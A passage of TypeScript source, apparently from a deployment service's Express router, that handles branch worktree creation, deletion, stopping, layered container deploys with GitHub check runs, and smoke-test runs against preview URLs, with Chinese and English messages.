      // P4 Part 18 (G1.5): refuse deploy if the project's clone isn't
      // ready yet. Legacy projects (no cloneStatus at all) pass
      // through because they use config.repoRoot via the fallback in
      // getProjectRepoRoot — there's nothing to clone. Only G1
      // projects with an explicit cloneStatus hit this guard.
      if (targetProject.cloneStatus && targetProject.cloneStatus !== 'ready') {
        const statusMsg: Record<string, string> = {
          pending: '项目尚未开始克隆。请先 POST /api/projects/' + effectiveProjectId + '/clone',
          cloning: '项目正在克隆中，请等待完成后重试。',
          error: '项目上次克隆失败，请先重试克隆：' + (targetProject.cloneError || '未知错误'),
        };
        res.status(409).json({
          error: 'project_not_ready',
          cloneStatus: targetProject.cloneStatus,
          message: statusMsg[targetProject.cloneStatus] || `项目克隆状态异常: ${targetProject.cloneStatus}`,
        });
        return;
      }

      // P4 Part 18 (G1.2): resolve the git repo root for the target
      // project. Legacy 'default' projects (and any project without a
      // cloned repoPath) fall back to the globally-mounted repoRoot.
      const branchRepoRoot = stateService.getProjectRepoRoot(effectiveProjectId, config.repoRoot);
      // FU-04: nested worktree layout — `<base>/<projectId>/<slug>`.
      // Two projects sharing a branch name (e.g. "main") get their
      // own subdirectories instead of colliding.
      const worktreePath = WorktreeService.worktreePathFor(config.worktreeBase, effectiveProjectId, id);
      await shell.exec(`mkdir -p "${path.posix.dirname(worktreePath)}"`);
      await worktreeService.create(branchRepoRoot, branch, worktreePath);

      const entry: BranchEntry = {
        id,
        projectId: effectiveProjectId,
        branch,
        worktreePath,
        services: {},
        status: 'idle',
        createdAt: new Date().toISOString(),
      };
      stateService.addBranch(entry);
      stateService.save();

      res.status(201).json({ branch: entry });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  router.delete('/branches/:id', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    // Project-key scope check: refuse if this branch belongs to a
    // different project than the one the key was minted for.
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }

    // ── Cluster-aware delete ──
    //
    // If the branch is owned by a remote executor, the master doesn't have
    // the worktree or containers locally — deleting locally would silently
    // succeed on master state while leaving the real worktree + containers
    // orphaned on the executor. Proxy the delete to the owning executor's
    // `/exec/delete` endpoint first, then drop master-side state.
    //
    // When proxying fails because the executor is offline, we still remove
    // the master-side state entry (the branch can't be recovered from here)
    // but emit an error step so the operator knows the remote worktree
    // may need manual cleanup.
    const remoteExecutor =
      entry.executorId && registry
        ? registry.getAll().find(n => n.id === entry.executorId && n.role !== 'embedded')
        : null;

    initSSE(res);
    try {
      if (remoteExecutor) {
        // Proxy to the executor's /exec/delete endpoint.
        sendSSE(res, 'step', {
          step: 'dispatch',
          status: 'running',
          title: `正在请求执行器 ${remoteExecutor.id} 删除分支...`,
        });

        const upstreamUrl = `http://${remoteExecutor.host}:${remoteExecutor.port}/exec/delete`;
        let proxied = false;
        try {
          const upstream = await fetch(upstreamUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              ...(config.executorToken ? { 'X-Executor-Token': config.executorToken } : {}),
            },
            body: JSON.stringify({ branchId: id }),
          });
          if (upstream.ok) {
            proxied = true;
            sendSSE(res, 'step', {
              step: 'dispatch',
              status: 'done',
              title: `执行器已删除分支 ${id}`,
            });
          } else {
            const errText = await upstream.text().catch(() => '');
            sendSSE(res, 'step', {
              step: 'dispatch',
              status: 'warning',
              title: `执行器拒绝删除 (HTTP ${upstream.status})，仍继续清理主节点状态`,
              log: errText.slice(0, 200),
            });
          }
        } catch (err) {
          sendSSE(res, 'step', {
            step: 'dispatch',
            status: 'warning',
            title: `无法连接执行器 ${remoteExecutor.id}，仍继续清理主节点状态`,
            log: (err as Error).message,
          });
        }

        // Drop master-side state unconditionally — if the executor is
        // unreachable, the operator can manually clean up on that node.
        stateService.removeLogs(id);
        stateService.removeBranch(id);
        stateService.save();

        sendSSE(res, 'complete', {
          message: proxied
            ? `分支 "${id}" 已在执行器 ${remoteExecutor.id} 上删除`
            : `分支 "${id}" 已从主节点移除；执行器上的残留请手动检查`,
        });
        return;
      }

      // Local delete path (unchanged behavior)
      for (const svc of Object.values(entry.services)) {
        sendSSE(res, 'step', { step: 'stop', status: 'running', title: `正在停止 ${svc.containerName}...` });
        try { await containerService.stop(svc.containerName); } catch { /* ok */ }
        sendSSE(res, 'step', { step: 'stop', status: 'done', title: `已停止 ${svc.containerName}` });
      }

      // Remove worktree
      sendSSE(res, 'step', { step: 'worktree', status: 'running', title: '正在删除工作树...' });
      try {
        const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
        await worktreeService.remove(repoRoot, entry.worktreePath);
      } catch { /* ok */ }
      sendSSE(res, 'step', { step: 'worktree', status: 'done', title: '工作树已删除' });

      stateService.removeLogs(id);
      stateService.removeBranch(id);
      stateService.save();

      sendSSE(res, 'complete', { message: `分支 "${id}" 已删除` });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Pull latest code ──

  router.post('/branches/:id/pull', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    try {
      const result = await worktreeService.pull(entry.branch, entry.worktreePath);
      res.json(result);
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Build & Run (SSE stream) ──

  router.post('/branches/:id/deploy', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }

    // P4 Part 18 (G1.5): same clone-ready guard as POST /branches.
    // Deploy uses worktree pull/create which would fail with a
    // cryptic git error if the target project's clone isn't ready.
    // Legacy branches (no projectId or legacy 'default') pass through.
    const deployProject = entry.projectId ? stateService.getProject(entry.projectId) : undefined;
    if (deployProject?.cloneStatus && deployProject.cloneStatus !== 'ready') {
      const statusMsg: Record<string, string> = {
        pending: '项目尚未开始克隆。请先 POST /api/projects/' + deployProject.id + '/clone',
        cloning: '项目正在克隆中，请等待完成后重试。',
        error: '项目上次克隆失败，请先重试克隆：' + (deployProject.cloneError || '未知错误'),
      };
      res.status(409).json({
        error: 'project_not_ready',
        cloneStatus: deployProject.cloneStatus,
        message: statusMsg[deployProject.cloneStatus] || `项目克隆状态异常: ${deployProject.cloneStatus}`,
      });
      return;
    }

    // P4 Part 17 (G2 fix): scope build profiles by the branch's project
    // so a deploy in project A doesn't pull in B's profiles. Pre-Part 3
    // branches default to 'default' (the legacy migration target).
    const profiles = stateService.getBuildProfilesForProject(entry.projectId || 'default');
    if (profiles.length === 0) {
      res.status(400).json({ error: '尚未配置构建配置，请先添加至少一个构建配置。' });
      return;
    }

    // ── Cluster dispatch decision ──
    //
    // Before touching the local deploy path, decide whether this branch
    // should be built on a remote executor. The request body can override
    // the auto-selection with { targetExecutorId: "executor-xxx" }; otherwise
    // the dispatcher picks based on current load. Returns null for the local
    // path (embedded master or no cluster), which is the previous behavior.
    const explicitTarget = (req.body?.targetExecutorId as string | undefined) || undefined;
    const remoteTarget = resolveDeployTarget(entry, explicitTarget);
    if (remoteTarget) {
      // Clear any stale error + clear the local services map since we're
      // handing this branch off to the remote — the master isn't running
      // containers for it, the executor is.
      entry.errorMessage = undefined;
      await proxyDeployToExecutor(remoteTarget, entry, res);
      return;
    }

    // Local path: if we were previously dispatched to a remote executor,
    // clear the sticky ownership so GET /api/branches stops reporting the
    // wrong placement.
    if (entry.executorId && registry) {
      const stillRemote = registry.getAll().find(n => n.id === entry.executorId);
      if (stillRemote?.role === 'embedded' || !stillRemote) {
        entry.executorId = undefined;
      }
    }

    initSSE(res);

    const opLog: OperationLog = {
      type: 'build',
      startedAt: new Date().toISOString(),
      status: 'running',
      events: [],
    };

    function logEvent(ev: OperationLogEvent) {
      opLog.events.push(ev);
      sendSSE(res, 'step', ev);
      logDeploy(id, `[${ev.status}] ${ev.title || ev.step}${ev.log ? ' — ' + ev.log : ''}`);
    }

    try {
      logDeploy(id, '开始部署');

      // ── Capacity check (v3.1) ──
      // Emit a warning if the host is already over-subscribed. When the
      // warm-pool scheduler is enabled it will evict LRU branches automatically;
      // when it's disabled (default) the warning is the user's only signal
      // that they're at risk of OOM. Non-blocking so disabled setups keep
      // their existing behavior.
      const cap = computeCapacity();
      if (cap.current >= cap.max) {
        const msg = `容量超售: ${cap.current}/${cap.max} 容器 (${cap.totalMemGB}GB 宿主机). 建议启用 scheduler 或手动停止部分分支容器.`;
        logEvent({ step: 'capacity-warn', status: 'warning', title: msg, timestamp: new Date().toISOString() });
        logDeploy(id, `⚠ ${msg}`);
      }

      // Clear previous error state on new deploy
      entry.errorMessage = undefined;
      for (const svc of Object.values(entry.services)) {
        if (svc.errorMessage) svc.errorMessage = undefined;
      }
      entry.status = 'building';

      // ── GitHub Checks integration ──
      // Priority for the commit SHA fed to the check run:
      //   1. req.body.commitSha — the authoritative value from the
      //      webhook-originated dispatcher, pinned at webhook-handling
      //      time so concurrent pushes can't race it
      //   2. entry.githubCommitSha — stored on the branch by the push
      //      handler (same value in the normal flow)
      //   3. current worktree HEAD — fallback for UI-triggered deploys
      // If none of the above resolve, the check-run path is a no-op.
      const bodyCommitSha = typeof req.body?.commitSha === 'string'
        && /^[0-9a-f]{7,40}$/i.test(req.body.commitSha)
        ? req.body.commitSha : undefined;
      if (bodyCommitSha) {
        entry.githubCommitSha = bodyCommitSha;
      } else if (entry.githubRepoFullName && !entry.githubCommitSha) {
        try {
          const sha = await shell.exec('git rev-parse HEAD', { cwd: entry.worktreePath });
          if (sha.exitCode === 0) {
            entry.githubCommitSha = sha.stdout.trim();
          }
        } catch {
          /* non-fatal — check run just won't fire */
        }
      }
      stateService.save();
      // Open an in-progress check run — best effort, errors logged not
      // thrown (so GitHub connectivity issues don't block the deploy).
      await checkRunRunner.ensureOpen(entry);

      // Pull latest code
      logEvent({ step: 'pull', status: 'running', title: '正在拉取最新代码...', timestamp: new Date().toISOString() });
      await checkRunRunner.progress(entry, {
        title: '拉取最新代码…',
        summary: `分支: \`${entry.branch}\`\n阶段: git fetch + reset`,
        force: true,
      });
      const pullResult = await worktreeService.pull(entry.branch, entry.worktreePath);
      logEvent({ step: 'pull', status: 'done', title: `已拉取: ${pullResult.head}`, detail: pullResult as unknown as Record<string, unknown>, timestamp: new Date().toISOString() });

      // Clear pinned commit — deploy always restores to branch HEAD
      if (entry.pinnedCommit) {
        entry.pinnedCommit = undefined;
        logEvent({ step: 'pull', status: 'done', title: '已取消固定提交，恢复到分支最新', timestamp: new Date().toISOString() });
      }
      stateService.save();

      // ── Compute startup layers (topological sort by dependsOn) ──
      // P4 Part 17 (G2 fix): scope infra by the branch's project so the
      // dependency resolver only sees infra services actually owned by
      // this project. Avoids cross-project bleed where project A's
      // dependsOn references could resolve to project B's mongo.
      const infraIds = new Set(
        stateService.getInfraServicesForProject(entry.projectId || 'default')
          .filter(s => s.status === 'running')
          .map(s => s.id),
      );

      const { layers, warnings: topoWarnings } = topoSortLayers(
        profiles,
        p => p.id,
        p => p.dependsOn ?? [],
        infraIds,
      );

      // ── Trace: dependency graph + layer plan ──
      const depGraph: Record<string, string[]> = {};
      for (const p of profiles) {
        if (p.dependsOn && p.dependsOn.length > 0) depGraph[p.id] = p.dependsOn;
      }
      logEvent({
        step: 'startup-plan',
        status: 'info',
        title: `启动计划: ${layers.length} 层, ${profiles.length} 服务`,
        detail: {
          dependencyGraph: depGraph,
          layers: layers.map(l => ({ layer: l.layer, services: l.items.map(p => p.id) })),
          resolvedInfra: Array.from(infraIds),
          ...(topoWarnings.length > 0 ? { warnings: topoWarnings } : {}),
        },
        timestamp: new Date().toISOString(),
      });

      // ── Pre-allocate ports synchronously (before parallel execution) ──
      for (const profile of profiles) {
        if (!entry.services[profile.id]) {
          const hostPort = stateService.allocatePort(config.portStart);
          entry.services[profile.id] = {
            profileId: profile.id,
            containerName: `cds-${id}-${profile.id}`,
            hostPort,
            status: 'idle',
          };
        }
      }
      stateService.save();

      // ── Execute layer by layer (parallel within each layer) ──
      for (let layerIdx = 0; layerIdx < layers.length; layerIdx++) {
        const layer = layers[layerIdx];
        const layerServiceNames = layer.items.map(p => p.name).join(', ');
        logEvent({
          step: `layer-${layer.layer}`,
          status: 'running',
          title: `启动第 ${layer.layer} 层: ${layerServiceNames}`,
          timestamp: new Date().toISOString(),
        });
        // Progress PATCH to GitHub so PR reviewers refreshing the Checks
        // panel see "构建第 X/Y 层 (services...)" instead of a stale
        // "Deploying to CDS…" for the entire build. Force=true so layer
        // transitions always push even inside the 5s throttle window.
        await checkRunRunner.progress(entry, {
          title: `构建第 ${layerIdx + 1}/${layers.length} 层`,
          summary: `分支 \`${entry.branch}\` 正在并行构建: ${layerServiceNames}`,
          force: true,
        });

        const layerStartTime = Date.now();

        await Promise.all(layer.items.map(async (profile) => {
          // Resolve baseline → branch override → deploy-mode override
          const effectiveProfile = resolveEffectiveProfile(profile, entry);
          const branchOverride = entry.profileOverrides?.[profile.id];
          const activeMode = effectiveProfile.activeDeployMode;
          const modeLabel = activeMode && effectiveProfile.deployModes?.[activeMode]
            ? ` [${effectiveProfile.deployModes[activeMode].label}]`
            : '';
          const overrideLabel = branchOverride ? ' (分支自定义)' : '';
          const serviceStartTime = Date.now();
          logEvent({
            step: `build-${profile.id}`,
            status: 'running',
            title: `正在构建 ${profile.name}${modeLabel}${overrideLabel}...`,
            timestamp: new Date().toISOString(),
          });

          const svc = entry.services[profile.id];
          svc.status = 'building';

          try {
            const mergedEnv = getMergedEnv(entry.projectId);

            // ── Trace: resolved CDS_* env vars for this service ──
            const cdsVars: Record<string, string> = {};
            for (const [k, v] of Object.entries(mergedEnv)) {
              if (k.startsWith('CDS_')) cdsVars[k] = v;
            }
            logEvent({
              step: `env-${profile.id}`,
              status: 'info',
              title: `${effectiveProfile.name} 环境变量`,
              detail: {
                cdsVars: maskSecrets(cdsVars),
                profileEnvKeys: Object.keys(effectiveProfile.env ?? {}),
                deployMode: effectiveProfile.activeDeployMode || 'default',
                branchOverrideKeys: branchOverride ? Object.keys(branchOverride) : [],
              },
              timestamp: new Date().toISOString(),
            });

            await containerService.runService(entry, effectiveProfile, svc, (chunk) => {
              sendSSE(res, 'log', { profileId: profile.id, chunk });
              for (const line of chunk.split('\n')) {
                if (line.trim()) {
                  logDeploy(id, line);
                  // Also store container output in operation log for historical viewing
                  opLog.events.push({
                    step: `log-${profile.id}`,
                    status: 'info',
                    title: line.trim(),
                    timestamp: new Date().toISOString(),
                  });
                }
              }
            }, mergedEnv);

            // Phase 1 passed (container alive). Set status based on startup signal.
            if (profile.startupSignal) {
              // Startup signal mode: watch container logs for a known string
              svc.status = 'starting';
              stateService.save();
              const elapsed = Date.now() - serviceStartTime;
              logEvent({
                step: `build-${profile.id}`,
                status: 'done',
                title: `${profile.name} 容器已启动，等待启动信号 :${svc.hostPort}`,
                detail: { elapsedMs: elapsed, startupSignal: profile.startupSignal },
                timestamp: new Date().toISOString(),
              });

              // Await startup signal — keep SSE stream open until ready
              const ready = await containerService.waitForStartupSignal(svc.containerName, profile.startupSignal, (chunk) => {
                for (const line of chunk.split('\n')) {
                  if (line.trim()) logDeploy(id, line);
                }
              });
              if (ready) {
                svc.status = 'running';
                logDeploy(id, `${profile.name} 启动成功 ✓`);
              } else {
                logDeploy(id, `${profile.name} 启动信号超时，服务可能仍在初始化`);
              }
              stateService.save();
            } else {
              svc.status = 'running';
              const elapsed = Date.now() - serviceStartTime;
              logEvent({
                step: `build-${profile.id}`,
                status: 'done',
                title: `${profile.name} 运行于 :${svc.hostPort}`,
                detail: { elapsedMs: elapsed },
                timestamp: new Date().toISOString(),
              });
            }
          } catch (err) {
            svc.status = 'error';
            svc.errorMessage = (err as Error).message;
            const elapsed = Date.now() - serviceStartTime;
            logEvent({
              step: `build-${profile.id}`,
              status: 'error',
              title: `${profile.name} 失败`,
              log: (err as Error).message,
              detail: { elapsedMs: elapsed },
              timestamp: new Date().toISOString(),
            });
          }
        }));

        const layerElapsed = Date.now() - layerStartTime;
        logEvent({
          step: `layer-${layer.layer}`,
          status: 'done',
          title: `第 ${layer.layer} 层完成`,
          detail: { elapsedMs: layerElapsed },
          timestamp: new Date().toISOString(),
        });
      }

      // Update overall status
      const statuses = Object.values(entry.services).map(s => s.status);
      const hasRunning = statuses.some(s => s === 'running');
      const hasStarting = statuses.some(s => s === 'starting');
      const hasError = statuses.some(s => s === 'error');
      entry.status = hasRunning ? 'running' : hasStarting ? 'starting' : 'error';
      entry.lastAccessedAt = new Date().toISOString();

      opLog.status = hasError ? 'error' : 'completed';
      opLog.finishedAt = new Date().toISOString();
      stateService.appendLog(id, opLog);
      stateService.save();

      const failedNames = Object.values(entry.services)
        .filter(s => s.status === 'error')
        .map(s => s.profileId);
      const completeMsg = hasError
        ? `部分服务启动失败: ${failedNames.join(', ')}`
        : '所有服务已启动';
      logDeploy(id, `部署完成: ${completeMsg}`);
      sendSSE(res, 'complete', {
        message: completeMsg,
        services: entry.services,
      });

      // Phase 4: auto-smoke after a green deploy (best-effort; never
      // blocks the deploy conclusion, never throws out of the handler).
      const smokeResult = await maybeRunAutoSmoke(res, entry, hasError);

      // Finalize the GitHub check run (best-effort). `hasError` decides
      // success vs failure; the preview URL surfaces in the check-run
      // summary so GitHub's "Details" button jumps straight to preview.
      // logTail = last 80 events rendered as "[status] step: title"
      // lines, surfaced under "Show more" in GitHub's Checks panel.
      //
      // Phase 5: if auto-smoke ran, fold its result into the check-run
      // conclusion so the PR Checks panel shows "CDS Deploy" red when
      // deploy is green but smoke tripped (most useful signal for PR
      // reviewers — "deployed fine but API is broken").
      const smokeOk = smokeResult
        ? smokeResult.exitCode === 0 && smokeResult.failedCount === 0
        : true;
      const finalConclusion = hasError || !smokeOk ? 'failure' : 'success';
      const summary = smokeResult
        ? `${completeMsg} | 冒烟 ${smokeOk ? '✅' : '❌'} pass=${smokeResult.passedCount} fail=${smokeResult.failedCount} (${smokeResult.elapsedSec}s)`
        : completeMsg;
      await checkRunRunner.finalize(entry, {
        conclusion: finalConclusion,
        summary,
        previewUrl: checkRunRunner.derivePreviewUrl(entry),
        logTail: opLog.events.slice(-80).map((ev) => {
          const st = ev.status || '?';
          const ttl = ev.title || ev.step;
          return `[${st}] ${ev.step}: ${ttl}`;
        }).join('\n'),
      });
    } catch (err) {
      entry.status = 'error';
      entry.errorMessage = (err as Error).message;
      opLog.status = 'error';
      opLog.finishedAt = new Date().toISOString();
      stateService.appendLog(id, opLog);
      stateService.save();
      logDeploy(id, `部署失败: ${(err as Error).message}`);
      sendSSE(res, 'error', { message: (err as Error).message });
      await checkRunRunner.finalize(entry, {
        conclusion: 'failure',
        summary: (err as Error).message || '部署失败',
        previewUrl: checkRunRunner.derivePreviewUrl(entry),
        logTail: opLog.events.slice(-80).map((ev) => {
          const st = ev.status || '?';
          const ttl = ev.title || ev.step;
          return `[${st}] ${ev.step}: ${ttl}`;
        }).join('\n'),
      });
    } finally {
      res.end();
    }
  });

  // ── Redeploy a single service (SSE stream) ──

  router.post('/branches/:id/deploy/:profileId', async (req, res) => {
    const { id, profileId } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }

    // P4 Part 17 (G2 fix): scope by the branch's project so a
    // single-service redeploy can't accidentally pick up a same-named
    // profile from a different project.
    const profiles = stateService.getBuildProfilesForProject(entry.projectId || 'default');
    const profile = profiles.find(p => p.id === profileId);
    if (!profile) {
      res.status(404).json({ error: `构建配置 "${profileId}" 不存在` });
      return;
    }

    initSSE(res);

    const opLog: OperationLog = {
      type: 'build',
      startedAt: new Date().toISOString(),
      status: 'running',
      events: [],
    };

    function logEvent(ev: OperationLogEvent) {
      opLog.events.push(ev);
      sendSSE(res, 'step', ev);
      logDeploy(id, `[${ev.status}] ${ev.title || ev.step}${ev.log ? ' — ' + ev.log : ''}`);
    }

    try {
      logDeploy(id, `开始部署服务 ${profile.name}`);

      // Clear previous error state on new deploy
      entry.errorMessage = undefined;
      const existingSvc = entry.services[profile.id];
      if (existingSvc?.errorMessage) existingSvc.errorMessage = undefined;
      stateService.save();

      // Pull latest code
      logEvent({ step: 'pull', status: 'running', title: '正在拉取最新代码...', timestamp: new Date().toISOString() });
      const pullResult = await worktreeService.pull(entry.branch, entry.worktreePath);
      logEvent({ step: 'pull', status: 'done', title: `已拉取: ${pullResult.head}`, detail: pullResult as unknown as Record<string, unknown>, timestamp: new Date().toISOString() });

      // Clear pinned commit — deploy always restores to branch HEAD
      if (entry.pinnedCommit) {
        entry.pinnedCommit = undefined;
        logEvent({ step: 'pull', status: 'done', title: '已取消固定提交，恢复到分支最新', timestamp: new Date().toISOString() });
        stateService.save();
      }

      // Resolve baseline → branch override → deploy-mode override
      const effectiveProfile = resolveEffectiveProfile(profile, entry);
      const branchOverride = entry.profileOverrides?.[profile.id];
      const activeMode = effectiveProfile.activeDeployMode;
      const modeLabel = activeMode && effectiveProfile.deployModes?.[activeMode]
        ? ` [${effectiveProfile.deployModes[activeMode].label}]`
        : '';
      const overrideLabel = branchOverride ? ' (分支自定义)' : '';

      // Build & run the single profile
      logEvent({ step: `build-${profile.id}`, status: 'running', title: `正在构建 ${profile.name}${modeLabel}${overrideLabel}...`, timestamp: new Date().toISOString() });

      if (!entry.services[profile.id]) {
        const hostPort = stateService.allocatePort(config.portStart);
        entry.services[profile.id] = {
          profileId: profile.id,
          containerName: `cds-${id}-${profile.id}`,
          hostPort,
          status: 'building',
        };
        stateService.save();
      }

      const svc = entry.services[profile.id];
      svc.status = 'building';

      try {
        const mergedEnv = getMergedEnv(entry.projectId);
        await containerService.runService(entry, effectiveProfile, svc, (chunk) => {
          sendSSE(res, 'log', { profileId: profile.id, chunk });
          for (const line of chunk.split('\n')) {
            if (line.trim()) logDeploy(id, line);
          }
        }, mergedEnv);

        if (profile.startupSignal) {
          // Startup signal mode: watch container logs for a known string
          svc.status = 'starting';
          stateService.save();
          logEvent({ step: `build-${profile.id}`, status: 'done', title: `${profile.name} 容器已启动，等待启动信号 :${svc.hostPort}`, timestamp: new Date().toISOString() });

          const signalReady = await containerService.waitForStartupSignal(svc.containerName, profile.startupSignal, (chunk) => {
            for (const line of chunk.split('\n')) {
              if (line.trim()) logDeploy(id, line);
            }
          });
          if (signalReady) {
            svc.status = 'running';
            logDeploy(id, `${profile.name} 启动成功 ✓`);
          } else {
            logDeploy(id, `${profile.name} 启动信号超时`);
          }
          stateService.save();
        } else {
          svc.status = 'running';
          logEvent({ step: `build-${profile.id}`, status: 'done', title: `${profile.name} 运行于 :${svc.hostPort}`, timestamp: new Date().toISOString() });
        }
      } catch (err) {
        svc.status = 'error';
        svc.errorMessage = (err as Error).message;
        logEvent({ step: `build-${profile.id}`, status: 'error', title: `${profile.name} 失败`, log: (err as Error).message, timestamp: new Date().toISOString() });
      }

      // Update overall status
      const statuses = Object.values(entry.services).map(s => s.status);
      const hasRunning = statuses.some(s => s === 'running');
      const hasStarting = statuses.some(s => s === 'starting');
      entry.status = hasRunning ? 'running' : hasStarting ? 'starting' : 'error';
      entry.lastAccessedAt = new Date().toISOString();

      opLog.status = svc.status === 'running' ? 'completed' : 'error';
      opLog.finishedAt = new Date().toISOString();
      stateService.appendLog(id, opLog);
      stateService.save();

      const completeMsg = svc.status === 'running' ? `${profile.name} 已启动` : `${profile.name} 启动失败`;
      logDeploy(id, `部署完成: ${completeMsg}`);
      sendSSE(res, 'complete', {
        message: completeMsg,
        services: entry.services,
      });
    } catch (err) {
      entry.status = 'error';
      entry.errorMessage = (err as Error).message;
      opLog.status = 'error';
      opLog.finishedAt = new Date().toISOString();
      stateService.appendLog(id, opLog);
      stateService.save();
      logDeploy(id, `部署失败: ${(err as Error).message}`);
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Smoke test a branch's preview URL ──
  //
  // Phase 3 交付: 部署绿灯后,操作员点「冒烟测试」按钮触发这个端点,
  // CDS 以当前分支预览域名作为 SMOKE_TEST_HOST 运行 scripts/smoke-all.sh,
  // 并把 bash 子进程的 stdout/stderr 逐行以 SSE `line` 事件推给前端,
  // 最后 `complete` 事件带上退出码 + 耗时。
  //
  // AI_ACCESS_KEY 从 request body 或 project-scoped customEnv 里取,
  // CDS 自身的 state.json 不落库 plaintext(operator 每次触发都要粘,
  // 或一次性写进项目 env 的 _global 作用域即可)。
  //
  // 设计约束 (对齐 .claude/rules/server-authority.md):
  //   - 使用 CancellationToken.None 等价语义: 客户端断 SSE 不杀 bash
  //   - 10 秒 keepalive 心跳防 proxy 超时
  //   - stdout/stderr 合并推送(smoke-*.sh 的 ❌ 都在 stderr)
  //
  // SMOKE_SCRIPT_DIR 默认为 `<process.cwd()>/scripts` (CDS 进程启动目录的
  // scripts 子目录),可通过 env `CDS_SMOKE_SCRIPT_DIR` 覆盖 —— 方便容器化
  // 部署时把脚本挂到固定路径。
  router.post('/branches/:id/smoke', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }

    // Resolve preview URL. Without one the smoke has no target, so we
    // refuse up-front with a clear message instead of letting bash try
    // to hit an empty URL.
    const previewHost = config.previewDomain || config.rootDomains?.[0];
    if (!previewHost) {
      res.status(400).json({
        error: 'preview_host_missing',
        message: '未配置 previewDomain / rootDomains,无法推导预览 URL — 请先在 cds.config.json 设置。',
      });
      return;
    }
    const smokeHost = `https://${entry.id}.${previewHost}`;

    const body = (req.body || {}) as {
      accessKey?: string;
      impersonateUser?: string;
      skip?: string;
      failFast?: boolean;
    };

    // AI_ACCESS_KEY resolution order:
    //   1. request body `accessKey` (operator paste)
    //   2. state.customEnv._global.AI_ACCESS_KEY (project-global fallback)
    // Never reads from process.env — that would leak the CDS process
    // env into the smoke target.
    const globalEnv = stateService.getCustomEnv('_global');
    const accessKey = (body.accessKey || globalEnv?.AI_ACCESS_KEY || '').trim();
    if (!accessKey) {
      res.status(400).json({
        error: 'access_key_missing',
        message: '需要 accessKey (请求体字段) 或在环境变量 _global.AI_ACCESS_KEY 预设。',
      });
      return;
    }

    // Resolve script location (helper shared with the auto-deploy hook).
    const script = resolveSmokeScriptDir();
    if (!script.exists) {
      res.status(500).json({
        error: 'smoke_script_missing',
        message: `找不到 smoke-all.sh (查找路径 ${script.entry})。请确认 scripts/ 目录已随 CDS 部署并设置 CDS_SMOKE_SCRIPT_DIR。`,
      });
      return;
    }

    // ── Open SSE ──
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'keep-alive',
      'X-Accel-Buffering': 'no',
    });
    const safeSend = (event: string, data: unknown) => {
      try { sendSSE(res, event, data); } catch { /* client gone */ }
    };
    const keepalive = setInterval(() => {
      try { res.write(':keepalive\n\n'); } catch { /* noop */ }
    }, 10_000);

    safeSend('start', {
      branchId: entry.id,
      host: smokeHost,
      impersonateUser: body.impersonateUser || 'admin',
      skip: body.skip || '',
      script: script.entry,
    });

    runSmokeForBranch({
      branch: entry,
      previewHost: smokeHost,
      accessKey,
      impersonateUser: body.impersonateUser,
      skip: body.skip,
      failFast: body.failFast,
      scriptDir: script.dir,
      onLine: (channel, text) => safeSend('line', { stream: channel, text }),
      onError: (err) => {
        clearInterval(keepalive);
        safeSend('error', { message: err.message });
        try { res.end(); } catch { /* noop */ }
      },
      onComplete: (result) => {
        clearInterval(keepalive);
        safeSend('complete', result);
        try { res.end(); } catch { /* noop */ }
      },
    });
  });

  // ── Stop all services for a branch ──

  router.post('/branches/:id/stop', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }

    // ── Cluster-aware stop ──
    //
    // Branches owned by a remote executor have no local containers — calling
    // containerService.stop on master is a silent no-op that leaves the real
    // containers running on the executor. Proxy to /exec/stop instead.
    const remoteExecutor =
      entry.executorId && registry
        ? registry.getAll().find(n => n.id === entry.executorId && n.role !== 'embedded')
        : null;
    if (remoteExecutor) {
      entry.status = 'stopping';
      for (const svc of Object.values(entry.services)) {
        if (svc.status === 'running' || svc.status === 'starting') {
          svc.status = 'stopping';
        }
      }
      stateService.save();
      try {
        const upstreamUrl = `http://${remoteExecutor.host}:${remoteExecutor.port}/exec/stop`;
        const upstream = await fetch(upstreamUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            ...(config.executorToken ? { 'X-Executor-Token': config.executorToken } : {}),
          },
          body: JSON.stringify({ branchId: id }),
        });
        if (!upstream.ok) {
          const errText = await upstream.text().catch(() => '');
          res.status(502).json({
            error: `执行器拒绝停止请求 (HTTP ${upstream.status}): ${errText.slice(0, 200)}`,
          });
          return;
        }
        // The executor's next heartbeat will reconcile status, but set
        // plausible local state in the meantime.
        for (const svc of Object.values(entry.services)) svc.status = 'stopped';
        entry.status = 'idle';
        stateService.save();
        res.json({ message: `已请求执行器 ${remoteExecutor.id} 停止所有服务` });
      } catch (err) {
        res.status(502).json({ error: `无法连接执行器: ${(err as Error).message}` });
      }
      return;
    }

    try {
      // Set stopping state immediately so frontend can show animation
      entry.status = 'stopping';
